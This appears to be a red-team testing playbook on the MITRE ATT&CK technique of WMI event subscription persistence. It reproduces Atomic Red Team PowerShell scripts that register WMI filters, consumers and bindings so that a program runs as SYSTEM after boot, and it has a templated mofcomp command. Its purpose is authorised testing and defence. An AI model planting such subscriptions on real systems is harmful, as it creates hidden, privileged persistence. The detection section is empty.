---
name: "T1546.003_windows-management-instrumentation-event-subscription"
description: "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription."
category: "authorization"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1546.003
  - privilege-escalation
  - persistence
  - windows
  - sub-technique
technique_id: "T1546.003"
tactic: "privilege-escalation"
all_tactics:
  - privilege-escalation
  - persistence
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1546/003"
tech_stack:
  - windows
cwe_ids:
  - CWE-269
chains_with:
  - T1546
  - T1546.001
  - T1546.002
  - T1546.004
  - T1546.005
  - T1546.006
  - T1546.007
  - T1546.008
  - T1546.009
  - T1546.010
  - T1546.011
  - T1546.012
  - T1546.013
  - T1546.014
  - T1546.015
  - T1546.016
  - T1546.017
  - T1546.018
prerequisites:
  - T1546
severity_boost:
  T1546: "Chain with T1546 for deeper attack path"
  T1546.001: "Chain with T1546.001 for deeper attack path"
  T1546.002: "Chain with T1546.002 for deeper attack path"
---

# T1546.003 Windows Management Instrumentation Event Subscription

> **Sub-technique of:** T1546

## High-Level Description

Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.

Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may also compile WMI scripts – using `mofcomp.exe` –into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.

WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.

## Kill Chain Phase

- Privilege Escalation (TA0004)
- Persistence (TA0003)

**Platforms:** Windows

## What to Check

- [ ] Identify if Windows Management Instrumentation Event Subscription technique is applicable to target environment
- [ ] Check Windows systems for indicators of Windows Management Instrumentation Event Subscription
- [ ] Verify mitigations are bypassed or absent (3 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Persistence via WMI Event Subscription - CommandLineEventConsumer

Run from an administrator powershell window. After running, reboot the victim machine.
After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.

Code references

https://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af

https://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';
                CommandLineTemplate="$($Env:SystemRoot)\System32\notepad.exe";}
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$FilterToConsumerArgs = @{
Filter = [Ref] $Filter;
Consumer = [Ref] $Consumer;
}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
```

### Atomic Test 2: Persistence via WMI Event Subscription - ActiveScriptEventConsumer

Run from an administrator powershell window. After running, reboot the victim machine.
After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.

Code references

https://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
$Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $FilterArgs

$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
                ScriptingEngine='VBScript';
                ScriptText='
                Set objws = CreateObject("Wscript.Shell")
                objws.Run "notepad.exe", 0, True
                '}
$Consumer=Set-WmiInstance -Namespace "root\subscription" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs

$FilterToConsumerArgs = @{
Filter = $Filter;
Consumer = $Consumer;
}
$FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs
```

### Atomic Test 3: Windows MOFComp.exe Load MOF File

The following Atomic will utilize MOFComp.exe to load a local MOF file.
The Managed Object Format (MOF) compiler parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. 
To query for the class:  gwmi __eventfilter -namespace root\subscription
A successful execution will add the class to WMI root namespace.
Reference: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/.

**Supported Platforms:** windows

```powershell
#{mofcomp_path} "#{mof_file}"
```

**Dependencies:**
- MofComp.exe must exist on disk at specified location (#{mofcomp_path})
- MofComp.exe must exist on disk at specified location (#{mof_file})


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Windows Management Instrumentation Event Subscription by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1546.003 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1018 User Account Management
By default, only administrators are allowed to connect remotely using WMI; restrict other users that are allowed to connect, or disallow all users from connecting remotely to WMI.

### M1026 Privileged Account Management
Prevent credential overlap across systems of administrator and privileged accounts.

### M1040 Behavior Prevention on Endpoint
On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent malware from abusing WMI to attain persistence.


## Detection

### Detect WMI Event Subscription for Persistence via WmiPrvSE Process and MOF Compilation


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Windows Management Instrumentation Event Subscription technique applicable | High | Privilege Escalation |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-269 | Improper Privilege Management |


## References

- [FireEye WMI 2015](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf)
- [Dell WMI Persistence](https://www.secureworks.com/blog/wmi-persistence)
- [FireEye WMI SANS 2015](https://web.archive.org/web/20221203203722/https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf)
- [Medium Detecting WMI Persistence](https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96)
- [Elastic - Hunting for Persistence Part 1](https://www.elastic.co/blog/hunting-for-persistence-using-elastic-security-part-1)
- [Mandiant M-Trends 2015](https://web.archive.org/web/20160629094859/https://www2.fireeye.com/rs/fireye/images/rpt-m-trends-2015.pdf)
- [Microsoft Register-WmiEvent](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/register-wmievent?view=powershell-5.1)
- [TechNet Autoruns](https://technet.microsoft.com/en-us/sysinternals/bb963902)
- [Microsoft MOF May 2018](https://docs.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof-)
- [Atomic Red Team - T1546.003](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1546.003)
- [MITRE ATT&CK - T1546.003](https://attack.mitre.org/techniques/T1546/003)
